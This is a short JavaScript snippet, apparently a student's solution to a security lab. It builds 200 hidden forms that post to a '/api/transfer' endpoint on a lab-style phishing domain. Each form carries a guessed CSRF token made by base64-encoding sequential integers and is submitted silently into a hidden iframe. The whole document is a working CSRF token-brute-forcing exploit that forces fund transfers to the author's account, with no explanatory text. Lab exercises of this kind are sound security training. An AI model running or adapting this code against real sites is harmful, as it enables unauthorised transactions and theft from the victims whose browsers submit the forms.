const ME = "z5602760";
const START = 8576;   // 改成你刚观察到的当前值
const COUNT = 200;
const AMOUNT = 1;

const iframe = document.createElement("iframe");
iframe.name = "sink";
iframe.style.display = "none";
document.body.appendChild(iframe);

for (let i = 0; i < COUNT; i++) {
  const tokenInt = START + i;

  const f = document.createElement("form");
  f.method = "POST";
  f.action = "https://phish-me.quoccacorp.com/api/transfer";
  f.target = "sink";
  f.style.display = "none";

  const t = document.createElement("input");
  t.name = "csrf_token";
  t.value = btoa(String(tokenInt));

  const u = document.createElement("input");
  u.name = "username";
  u.value = ME;

  const a = document.createElement("input");
  a.name = "amount";
  a.value = String(AMOUNT);

  f.appendChild(t);
  f.appendChild(u);
  f.appendChild(a);
  document.body.appendChild(f);

  setTimeout(() => f.submit(), i * 20);
}
